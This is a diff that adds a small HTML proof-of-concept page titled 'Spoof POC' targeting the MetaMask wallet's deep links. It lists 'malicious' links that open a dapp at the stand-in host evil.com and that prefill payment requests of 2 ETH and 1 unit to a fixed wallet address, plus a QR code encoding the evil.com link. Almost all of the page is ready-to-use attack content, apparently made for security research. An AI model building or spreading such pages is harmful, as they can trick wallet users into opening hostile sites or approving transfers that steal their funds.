@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Spoof POC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        a {
+            display: block;
+            margin: 10px 0;
+            color: blue;
+        }
+        img {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Malicious DeepLinks</h1>
+
+    <a href="https://metamask.app.link/dapp/evil.com" target="_blank">Evil.Com</a>
+    <a href="https://metamask.app.link/send/pay-0x4F494E04D92bdD243c3Ed34Fb4662b2F79F2e1dF?value=2e18" target="_blank">Payment Send</a>
+    <a href="https://metamask.app.link/send/0x4F494E04D92bdD243c3Ed34Fb4662b2F79F2e1dF?value=2e18" target="_blank">Payment</a>
+    <a href="https://metamask.app.link/payment/0x4F494E04D92bdD243c3Ed34Fb4662b2F79F2e1dF?amount=1" target="_blank">Payment Channel</a>
+
+    <h2>Scan this QR Code</h2>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://metamask.app.link/dapp/evil.com" alt="QR Code to Evil.com">
+
+</body>
+</html>
